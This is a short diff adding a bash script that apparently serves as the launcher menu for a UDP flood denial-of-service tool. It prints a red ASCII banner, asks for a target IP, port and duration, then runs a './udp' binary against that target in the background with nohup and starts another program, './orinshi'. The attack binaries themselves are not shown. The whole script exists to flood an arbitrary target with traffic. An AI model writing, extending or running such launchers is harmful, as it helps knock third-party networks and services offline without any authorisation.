@@ -1,0 +1,14 @@
+    clear
+    echo -e "${RED}"
+echo -e "▄• ▄▌·▄▄▄▄   ▄▄▄·"
+echo -e "█▪██▌██▪ ██ ▐█ ▄█"
+echo -e "█▌▐█▌▐█· ▐█▌ ██▀·"
+echo -e "▐█▄█▌██. ██ ▐█▪·•"
+echo -e " ▀▀▀ ▀▀▀▀▀• .▀   "
+echo -e -n "${RED}Enter Target Ip: "
+read ip
+echo -e -n "${RED}Enter Port: "
+read port
+echo -e -n "${RED}Enter Time: "
+read time
+nohup ./udp $ip $port $time & clear & ./orinshi
